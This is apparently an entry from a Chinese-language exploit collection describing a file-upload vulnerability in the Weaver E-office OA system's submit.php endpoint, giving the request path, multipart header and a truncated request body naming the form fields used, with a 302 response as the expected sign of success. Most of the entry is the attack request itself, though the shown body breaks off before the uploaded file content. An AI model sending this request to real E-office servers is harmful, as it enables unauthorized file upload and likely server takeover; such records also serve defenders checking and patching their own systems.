# 泛微E-officesubmit.php文件上传漏洞

- **系统**：泛微OA　|　**类型**：文件上传　|　**CVE**：—
- **请求**：`GET /general/hrms/manage/submit.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=6863626f66d8f459eace16cc55e33b…`

**请求体 / payload**
```
--6863626f66d8f459eace16cc55e33b30
Content-Disposition: form-data; name="HR_ID"; filename=""
1
--6863626f66d8f459eace16cc55e33b30
Content-Disposition: form-data; name="ID"; filename=""
--6863626f66d8f459eace16cc55e33b30
Content-Disposition: form-data; name="USER_ID"; filename=""
--6863626f66d8f459eace16cc55e33b30
Content-Disposition: form-data; name="photo"; filename=""
--6863626f66d8f459eace16cc55e33b30
Content-Disposition: form-data; name="ATTACHMENT_PIC_NAME"; filename=""
C:\\fakepath\\4.jpg
--6863626f66d8f459eace16cc55e33b30
Content-Disposition: form-data; name="ATTACHMENT_ID_OLD"; filenam…（脚本共 4416 字，完整版见原文）
```
- **预期**：302　|　open